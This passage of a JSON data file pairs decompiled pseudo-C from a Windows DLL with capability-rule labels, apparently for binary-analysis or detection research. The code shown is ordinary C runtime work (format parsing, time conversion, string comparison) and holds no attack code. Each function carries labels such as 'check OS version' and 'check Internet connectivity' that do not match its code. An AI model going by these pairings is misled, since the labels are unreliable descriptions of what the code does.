(**(arg1 + 0x18) == 0x68) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x1;\n                    }\n                    else {\n                        piVar7 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar5 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x0001800b4d7b;\n                    }\n                    if (uVar5 != 0x6c) {\n                        if (uVar5 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar5 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar5 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x0001800b4d7b;\n                    }\n                    if (**(arg1 + 0x18) == 0x6c) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x4;\n                    }\n                    else {\n                        piVar7 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = piVar7;\n            }\ncode_r0x0001800b4d7b:\n            return CONCAT71(piVar7 >> 8, 1);\n        }\n        uStack48 = 0x1800b4c2e;\n        puVar6 = fcn.1800ba53c(arg1);\n        *puVar6 = 0x16;\n        uStack48 = 0x1800b4c39;\n        uVar8 = fcn.1800b3508();\n        return uVar8 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x0001800b4d7b;\n    *(arg1 + 0x2c) = 7;\n    uStack48 = *0x180123080 ^ &stack0xffffffffffffff98;\n    uVar5 = *(arg1 + 0x42);\n    uVar10 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x0001800b5113:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x0001800b5117:\n            arg2 = 10;\ncode_r0x0001800b511f:\n            cVar4 = fcn.1800b5b28(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x0001800b5126;\n            if (uVar5 == 0x43) {\ncode_r0x0001800b507f:\n                cVar4 = fcn.1800b58b8(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x0001800b528b;\n                if (uVar5 < 0x48) goto code_r0x0001800b5126;\n                if (uVar5 == 0x53) {\ncode_r0x0001800b50cf:\n                    cVar4 = fcn.1800b5e68(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x0001800b50e4;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x0001800b528b;\n                            goto code_r0x0001800b507f;\n                        }\n                        goto code_r0x0001800b5126;\n                    }\n                    cVar4 = fcn.1800b532c(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x0001800b5113;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.1800b5cf4(arg1);\n                goto code_r0x0001800b512b;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x0001800b50e4:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x0001800b50cf;\n                if (uVar5 == 0x75) goto code_r0x0001800b5117;\n                if (uVar5 != 0x78) goto code_r0x0001800b528b;\n                arg2 = 0x10;\n            }\n            goto code_r0x0001800b511f;\n        }\ncode_r0x0001800b5126:\n        cVar4 = fcn.1800b55c0(arg1);\n    }\ncode_r0x0001800b512b:\n    if ((cVar4 == '\\0') || (arg1[0x40] != 0)) goto code_r0x0001800b528b;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x0001800b5190;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x0001800b5190:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&stack0xffffffffffffffc8 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&stack0xffffffffffffffca + arg3 * 2) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar9 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.1800b408c(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar9, arg4);\n    }\n    puStack72 = arg1 + 0x10;\n    arg2_00 = &stack0xffffffffffffffc8;\n    fcn.1800b6198(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.1800b408c(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar9, arg4);\n    }\n    uVar8 = 0;\n    fcn.1800b6008(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.1800b408c(arg1_00, uVar8 & 0xffffffffffffff00 | 0x20, uVar9, arg1 + 0x28);\n    }\ncode_r0x0001800b528b:\n    uVar8 = fcn.18008fb00(uStack48 ^ &stack0xffffffffffffff98);\n    return uVar8;\n}\n",
        "token_count": 2758
    },
    "1800b596": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b5960(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    \n    uVar3 = *(arg1 + 0x3c);\n    uVar2 = uVar3;\n    iVar4 = 8;\n    if (uVar3 < 6) {\n        if (uVar3 == 5) goto code_r0x0001800b59af;\n        if (uVar3 != 0) {\n            uVar2 = uVar3 - 1;\n            if (uVar3 - 1 == 0) {\n                iVar4 = 1;\n                goto code_r0x0001800b59af;\n            }\n            uVar3 = uVar3 - 2;\n            uVar2 = uVar3;\n            if (uVar3 == 0) {\n                iVar4 = 2;\n                goto code_r0x0001800b59af;\n            }\n            goto code_r0x0001800b59a2;\n        }\n    }\n    else {\n        uVar2 = uVar3 - 6;\n        if ((uVar3 - 6 == 0) || (uVar2 = uVar3 - 7,  uVar3 - 7 == 0)) goto code_r0x0001800b59af;\n        uVar3 = uVar3 - 9;\n        uVar2 = uVar3;\n        if (uVar3 == 0) goto code_r0x0001800b59af;\ncode_r0x0001800b59a2:\n        uVar3 = uVar3 - 1;\n        uVar2 = uVar3;\n        if (uVar3 != 0) {\n            if (uVar3 != 1) {\n                iVar4 = 0;\n            }\n            goto code_r0x0001800b59af;\n        }\n    }\n    iVar4 = 4;\ncode_r0x0001800b59af:\n    if (iVar4 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar4 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar4 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar4 != 8) {\n            puVar1 = fcn.1800ba53c(uVar2);\n            *puVar1 = 0x16;\n            uVar2 = fcn.1800b3508();\n            return uVar2 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar2 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar3 = *(arg1 + 0x30);\n    if (((uVar3 >> 4 & 1) != 0) && (uVar2 < 0)) {\n        uVar2 = -uVar2;\n        uVar3 = uVar3 | 0x40;\n        *(arg1 + 0x30) = uVar3;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar3 & 0xfffffff7;\n        fcn.1800b3c20(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar2 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 0;\n    if (iVar4 == 8) {\n        fcn.1800b3ee0(arg1, uVar2, arg2);\n    }\n    else {\n        fcn.1800b3db4(arg1, uVar2 & 0xffffffff, arg2);\n    }\n    uVar3 = *(arg1 + 0x30);\n    if (((uVar3 >> 7 & 1) != 0) && ((*(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != '0')))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -1;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar3 >> 0xf, 1);\n}\n",
        "token_count": 1312
    },
    "1800b5b2": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.1800b5b28(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    \n    uVar3 = *(arg1 + 0x3c);\n    uVar2 = uVar3;\n    iVar4 = 8;\n    if (uVar3 < 6) {\n        if (uVar3 == 5) goto code_r0x0001800b5b77;\n        if (uVar3 != 0) {\n            uVar2 = uVar3 - 1;\n            if (uVar3 - 1 == 0) {\n                iVar4 = 1;\n                goto code_r0x0001800b5b77;\n            }\n            uVar3 = uVar3 - 2;\n            uVar2 = uVar3;\n            if (uVar3 == 0) {\n                iVar4 = 2;\n                goto code_r0x0001800b5b77;\n            }\n            goto code_r0x0001800b5b6a;\n        }\n    }\n    else {\n        uVar2 = uVar3 - 6;\n        if ((uVar3 - 6 == 0) || (uVar2 = uVar3 - 7,  uVar3 - 7 == 0)) goto code_r0x0001800b5b77;\n        uVar3 = uVar3 - 9;\n        uVar2 = uVar3;\n        if (uVar3 == 0) goto code_r0x0001800b5b77;\ncode_r0x0001800b5b6a:\n        uVar3 = uVar3 - 1;\n        uVar2 = uVar3;\n        if (uVar3 != 0) {\n            if (uVar3 != 1) {\n                iVar4 = 0;\n            }\n            goto code_r0x0001800b5b77;\n        }\n    }\n    iVar4 = 4;\ncode_r0x0001800b5b77:\n    if (iVar4 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar4 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar4 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar4 != 8) {\n            puVar1 = fcn.1800ba53c(uVar2);\n            *puVar1 = 0x16;\n            uVar2 = fcn.1800b3508();\n            return uVar2 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar2 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar3 = *(arg1 + 0x30);\n    if (((uVar3 >> 4 & 1) != 0) && (uVar2 < 0)) {\n        uVar2 = -uVar2;\n        uVar3 = uVar3 | 0x40;\n        *(arg1 + 0x30) = uVar3;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar3 & 0xfffffff7;\n        fcn.1800b3cc8(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar2 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 1;\n    if (iVar4 == 8) {\n        fcn.1800b3f70(arg1, uVar2, arg2);\n    }\n    else {\n        fcn.1800b3e3c(arg1, uVar2 & 0xffffffff, arg2);\n    }\n    uVar3 = *(arg1 + 0x30) >> 7;\n    uVar2 = uVar3;\n    if (((uVar3 & 1) != 0) && ((uVar2 = 0,  *(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != 0x30)))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -2;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar2 >> 8, 1);\n}\n",
        "token_count": 1341
    },
    "1800b9a6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.1800b9a6c(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *arg1_00;\n    ulong uStackX8;\n    int64_t iStack56;\n    int64_t *piStack48;\n    int64_t iStack40;\n    uchar auStack32 [16];\n    char cStack16;\n    \n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    if (arg1 == 0) {\n        puVar2 = fcn.1800ba53c(0);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        uStackX8 = 0;\n    }\n    else {\n        fcn.1800b1864(&iStack40, 0);\n        uStackX8 = 0;\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        arg1_00 = auStack32;\n        iStack56 = arg1;\n        piStack48 = arg2;\n        iVar1 = fcn.1800b64e8(arg1_00, &iStack56, &uStackX8);\n        if (iVar1 - 2U < 2) {\n            puVar2 = fcn.1800ba53c(arg1_00);\n            *puVar2 = 0x22;\n        }\n        if (cStack16 != '\\0') {\n            *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        }\n    }\n    return uStackX8;\n}\n",
        "token_count": 375
    },
    "1800b9a7": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.1800b9a74(int64_t arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *arg1_00;\n    uint auStackX8 [2];\n    int64_t iStack56;\n    int64_t *piStack48;\n    int64_t iStack40;\n    uchar auStack32 [16];\n    char cStack16;\n    \n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    if (arg1 == 0) {\n        puVar2 = fcn.1800ba53c(0);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n        auStackX8[0] = 0;\n    }\n    else {\n        fcn.1800b1864(&iStack40, 0);\n        auStackX8[0] = 0;\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        arg1_00 = auStack32;\n        iStack56 = arg1;\n        piStack48 = arg2;\n        iVar1 = fcn.1800b6448(arg1_00, &iStack56, auStackX8);\n        if (iVar1 - 2U < 2) {\n            puVar2 = fcn.1800ba53c(arg1_00);\n            *puVar2 = 0x22;\n        }\n        if (cStack16 != '\\0') {\n            *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        }\n    }\n    return auStackX8[0];\n}\n",
        "token_count": 382
    },
    "1800c0cd": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800c0b8d)\n// WARNING: Removing unreachable block (ram,0x0001800c0b9a)\n// WARNING: Removing unreachable block (ram,0x0001800c0ba4)\n// WARNING: Removing unreachable block (ram,0x0001800c0bb3)\n// WARNING: Removing unreachable block (ram,0x0001800c0bbe)\n// WARNING: Removing unreachable block (ram,0x0001800c0bc7)\n// WARNING: Removing unreachable block (ram,0x0001800c0bd0)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800c0cdc(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    uint *var_20h;\n    int32_t *var_bp_18h;\n    ulong *var_bp_10h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = auStackX16;\n    var_28h._0_1_ = 0;\n    var_bp_18h = aiStackX24;\n    var_bp_10h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.1800c0a68(var_30h, &var_2ch + 4, &var_20h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.1800c0c2c(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 428
    },
    "1800c191": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1800c1914(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x1800ed040;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x1800de8f0)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x1800ed140);\n    if (piVar3 == 0x1800ed140) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x1800ed040) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x1800de8f0)(0);\n                }\n                bVar4 = piVar3 != 0x1800ed048;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 276
    },
    "1800c6fb": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.1800c6fb8(int64_t *arg1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int64_t arg2;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t arg3;\n    \n    if (arg1 == NULL) {\n        puVar3 = fcn.1800ba53c(0);\n        *puVar3 = 0x16;\n        fcn.1800b3508();\n    }\n    else {\n        uVar2 = fcn.1800c20cc(arg1);\n        if (*(arg1 + 2) < 0) {\n            *(arg1 + 2) = 0;\n        }\n        arg2 = fcn.1800c8efc(uVar2 & 0xffffffff, 0, 1);\n        if (-1 < arg2) {\n            if ((*(arg1 + 0x14) & 0xc0) == 0) {\n                return arg2 - *(arg1 + 2);\n            }\n            uVar4 = uVar2 & 0x3f;\n            iVar5 = uVar2 >> 6;\n            arg3 = *arg1 - arg1[1];\n            cVar1 = *(*(iVar5 * 8 + 0x180129850) + 0x39 + uVar4 * 0x48);\n            if ((*(arg1 + 0x14) & 3) == 0) {\n                if ((*(arg1 + 0x14) >> 2 & 1) == 0) {\n                    puVar3 = fcn.1800ba53c(iVar5);\n                    *puVar3 = 0x16;\n                    return 0xffffffffffffffff;\n                }\n            }\n            else {\n                if ((cVar1 == '\\x01') && ((*(*(iVar5 * 8 + 0x180129850) + 0x3d + uVar4 * 0x48) & 2) != 0)) {\n                    uVar4 = fcn.1800c7234(arg1, arg2);\n                    return uVar4;\n                }\n                if (*(*(iVar5 * 8 + 0x180129850) + 0x38 + uVar4 * 0x48) < '\\0') {\n                    iVar5 = fcn.1800c73b0(arg1[1], *arg1);\n                    arg3 = arg3 + iVar5;\n                }\n            }\n            if (arg2 == 0) {\n                return arg3;\n            }\n            if ((*(arg1 + 0x14) & 1) == 0) {\n                if (cVar1 == '\\x01') {\n                    arg3 = arg3 >> 1;\n                }\n                return arg3 + arg2;\n            }\n            uVar4 = fcn.1800c70e8(arg1, arg2, arg3);\n            return uVar4;\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 666
    },
    "1800c780": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1800c7808(int32_t *arg1, int64_t *arg2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    char acStackX8 [8];\n    int64_t aiStackX24 [2];\n    \n    piVar3 = arg1;\n    if ((arg1 == NULL) || (fcn.1800ae290(arg1, 0xff, 0x24),  arg2 == NULL)) {\n        puVar2 = fcn.1800ba53c(piVar3);\n        *puVar2 = 0x16;\n        fcn.1800b3508();\n    }\n    else {\n        aiStackX24[0] = *arg2;\n        if ((-0xa8c1 < aiStackX24[0]) && (piVar3 = 0x79358efdf,  aiStackX24[0] < 0x79358efe0)) {\n            acStackX8[0] = '\\0';\n            iVar1 = fcn.1800c76cc(aiStackX24, acStackX8);\n            piVar3 = 0x1800f2fb0;\n            arg1[5] = iVar1;\n            iVar5 = 1;\n            iVar1 = aiStackX24[0] / 0x15180;\n            arg1[7] = iVar1;\n            aiStackX24[0] = aiStackX24[0] + iVar1 * -0x15180;\n            piVar6 = piVar3;\n            if (acStackX8[0] != '\\0') {\n                piVar3 = 0x1800f2fe8;\n                piVar6 = piVar3;\n            }\n            while (piVar3 = piVar3 + 1,  *piVar3 < iVar1) {\n                iVar5 = iVar5 + 1;\n            }\n            arg1[4] = iVar5 + -1;\n            arg1[3] = iVar1 - piVar6[iVar5 + -1];\n            iVar4 = *arg2;\n            arg1[8] = 0;\n            arg1[6] = (iVar4 / 0x15180 + 4) % 7;\n            iVar1 = aiStackX24[0] / 0xe10;\n            arg1[2] = iVar1;\n            aiStackX24[0] = aiStackX24[0] + iVar1 * -0xe10;\n            iVar4 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(aiStackX24[0]) >> 0x40, 0) + aiStackX24[0];\n            iVar1 = (iVar4 >> 5) - (iVar4 >> 0x3f);\n            arg1[1] = iVar1;\n            *arg1 = aiStackX24[0] + iVar1 * -0x3c;\n            return 0;\n        }\n        puVar2 = fcn.1800ba53c(piVar3);\n        *puVar2 = 0x16;\n    }\n    return 0x16;\n}\n",
        "token_count": 718
    },
    "1800cc29": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0001800cc33c: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0001800cc341)\n\nint32_t fcn.1800cc290(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t iStack56;\n    int64_t iStack48;\n    char cStack32;\n    \n    if (*0x180129c54 != 0) {\n        if ((arg1 == NULL) || (arg2 == NULL)) {\n            puVar3 = fcn.1800ba53c(arg1);\n            *puVar3 = 0x16;\n            fcn.1800b3508();\n            iVar7 = 0x7fffffff;\n        }\n        else {\n            fcn.1800b1864(&stack0xffffffffffffffc8, 0);\n            iVar6 = iStack48;\n            if (*(iStack48 + 0x138) == 0) goto code_r0x0001800cc256;\n            do {\n                if (*arg1 < 0x100) {\n                    uVar5 = *arg1;\n                    if ((*(\n                          L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                          + uVar5) & 1) != 0) {\n                        uVar5 = *(uVar5 + *(iVar6 + 0x110));\n                    }\n                    uVar1 = uVar5;\n                }\n                else {\n                    uVar1 = fcn.1800d3ee0(*arg1, &stack0xffffffffffffffd0);\n                    iVar6 = iStack48;\n                }\n                arg1 = arg1 + 1;\n                if (*arg2 < 0x100) {\n                    uVar5 = *arg2;\n                    if ((*(\n                          L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n                          + uVar5) & 1) != 0) {\n                        uVar5 = *(uVar5 + *(iVar6 + 0x110));\n                    }\n                    uVar2 = uVar5;\n                }\n                else {\n                    uVar2 = fcn.1800d3ee0(*arg2, &stack0xffffffffffffffd0);\n                    iVar6 = iStack48;\n                }\n                arg2 = arg2 + 1;\n                iVar7 = uVar1 - uVar2;\n            } while ((iVar7 == 0) && (uVar1 != 0));\n            if (cStack32 != '\\0') {\n                *(iStack56 + 